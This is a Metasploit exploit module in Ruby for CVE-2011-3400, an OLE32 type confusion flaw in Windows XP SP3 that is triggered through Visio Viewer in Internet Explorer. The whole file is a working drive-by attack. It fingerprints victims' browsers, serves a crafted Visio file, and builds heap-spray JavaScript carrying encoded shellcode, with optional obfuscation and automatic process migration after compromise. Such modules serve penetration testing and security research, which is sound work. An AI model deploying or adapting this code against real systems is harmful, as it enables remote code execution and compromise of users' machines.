# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##
 
require &#039;msf/core&#039;
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::HttpServer::HTML
 
    def initialize(info={})
        super(update_info(info,
            &#039;Name&#039;           => "Microsoft Windows OLE Object File Handling Remote Code Execution",
            &#039;Description&#039;    => %q{
                    This module exploits a type confusion vulnerability in the OLE32 component of
                Windows XP SP3. The vulnerability exists in the CPropertyStorage::ReadMultiple
                function.
 
                A Visio document with a specially crafted Summary Information Stream embedded allows
                to get remote code execution through Internet Explorer, on systems with Visio Viewer
                installed.
            },
            &#039;License&#039;        => MSF_LICENSE,
            &#039;Author&#039;         =>
                [
                    &#039;Luigi Auriemma&#039;, # Vulnerability discovery and PoC
                    &#039;juan vazquez&#039; # Metasploit module
                ],
            &#039;References&#039;     =>
                [
                    [ &#039;CVE&#039;, &#039;2011-3400&#039; ],
                    [ &#039;OSVDB&#039;, &#039;77663&#039;],
                    [ &#039;BID&#039;, &#039;50977&#039; ],
                    [ &#039;URL&#039;, &#039;http://aluigi.org/adv/ole32_1-adv.txt&#039; ],
                    [ &#039;URL&#039;, &#039;http://www.verisigninc.com/en_US/products-and-services/network-intelligence-availability/idefense/public-vulnerability-reports/articles/index.xhtml?id=966&#039; ]
                ],
            &#039;Payload&#039;        =>
                {
                    &#039;Space&#039;    => 1000,
                    &#039;BadChars&#039; => "\x00",
                    &#039;DisableNops&#039; => true
                },
            &#039;DefaultOptions&#039;  =>
                {
                    &#039;InitialAutoRunScript&#039; => &#039;migrate -f&#039;
                },
            &#039;Platform&#039;       => &#039;win&#039;,
            &#039;Targets&#039;        =>
                [
                    [ &#039;Automatic&#039;, {} ],
                    [
                        &#039;IE 6 on Windows XP SP3 / Visio Viewer 2010&#039;,
                        {
                            &#039;Offset&#039;    => &#039;0x7ee - code.length&#039;,
                            &#039;PtrToHeap&#039; => "\x35\x40" # Pointer from IEXPLORE.exe PE header
                        }
                    ],
                    [
                        &#039;IE 7 on Windows XP SP3 / Visio Viewer 2010&#039;,
                        {
                            &#039;Offset&#039;    => &#039;0x7ee - code.length&#039;,
                            &#039;PtrToHeap&#039; => "\x35\x40" # Pointer from IEXPLORE.exe PE header
                        }
                    ]
                ],
            &#039;Privileged&#039;     => false,
            &#039;DisclosureDate&#039; => "Dec 13 2011",
            &#039;DefaultTarget&#039;  => 0))
 
        register_options(
            [
                OptBool.new(&#039;OBFUSCATE&#039;, [false, &#039;Enable JavaScript obfuscation&#039;, false])
            ], self.class)
 
    end
 
    def get_target(agent)
        # If the user is already specified by the user, we&#039;ll just use that
        return target if target.name != &#039;Automatic&#039;
 
        if agent =~ /NT 5\.1/ and agent =~ /MSIE 6/
            return targets[1]  # IE 6 on Windows XP SP3
        elsif agent =~ /NT 5\.1/ and agent =~ /MSIE 7/
            return targets[2]  # IE 7 on Windows XP SP3
        else
            return nil
        end
    end
 
    def exploit
        @vsd = create_vsd
        super
    end
 
    def on_request_uri(cli, request)
 
        agent = request.headers[&#039;User-Agent&#039;]
        my_target = get_target(agent)
 
        # Avoid the attack if the victim doesn&#039;t have the same setup we&#039;re targeting
        if my_target.nil?
            print_error("Browser not supported: #{agent}")
            send_not_found(cli)
            return
        end
 
        print_status("Client requesting: #{request.uri}")
 
        if request.uri =~ /\.vsd$/
            @vsd[5106, 2] = my_target[&#039;PtrToHeap&#039;]
            print_status("Sending Exploit VSD")
            send_response(cli, @vsd, { &#039;Content-Type&#039; => &#039;application/vnd.visio&#039; })
            return
        end
 
        p = payload.encoded
 
        js_code = Rex::Text.to_unescape(p, Rex::Arch.endian(my_target.arch))
        js_nops = Rex::Text.to_unescape("\x0c"*4, Rex::Arch.endian(my_target.arch))
 
        js_pivot = <<-JS
        var heap_obj = new heapLib.ie(0x20000);
        var code = unescape("#{js_code}");
        var nops = unescape("#{js_nops}");
 
        while (nops.length < 0x80000) nops += nops;
        var offset = nops.substring(0, #{my_target[&#039;Offset&#039;]});
        var shellcode = offset + code + nops.substring(0, 0x800-code.length-offset.length);
 
        while (shellcode.length < 0x40000) shellcode += shellcode;
        var block = shellcode.substring(0, (0x80000-6)/2);
 
        heap_obj.gc();
        for (var i=1; i < 0x1e0; i++) {
            heap_obj.alloc(block);
        }
        JS
 
        js_pivot = heaplib(js_pivot, {:noobfu => true})
 
        if datastore[&#039;OBFUSCATE&#039;]
            js_pivot = ::Rex::Exploitation::JSObfu.new(js_pivot)
            js_pivot.obfuscate
        end
 
        vsd_uri = (&#039;/&#039; == get_resource[-1,1]) ? get_resource[0, get_resource.length-1] : get_resource
        vsd_uri << "/#{rand_text_alpha(rand(6)+3)}.vsd"
 
        html = %Q|
        <html>
        <head>
        <script>
        #{js_pivot}
        </script>
        </head>
        <body>
 
        <object classid="clsid:F8CF7A98-2C45-4c8d-9151-2D716989DDAB" ID="target">
        <param name=src value="#{vsd_uri}">
        </object>
        </body>
        </html>
        |
 
        html = html.gsub(/^\t\t/, &#039;&#039;)
 
        print_status("Sending html")
        send_response(cli, html, {&#039;Content-Type&#039;=>&#039;text/html&#039;})
    end
 
    def create_vsd
        path = ::File.join( Msf::Config.install_root, "data", "exploits", "CVE-2011-3400", "CVE-2011-3400.vsd" )
        fd = ::File.open( path, "rb" )
        vsd = fd.read(fd.stat.size)
        fd.close
        return vsd
    end
 
end



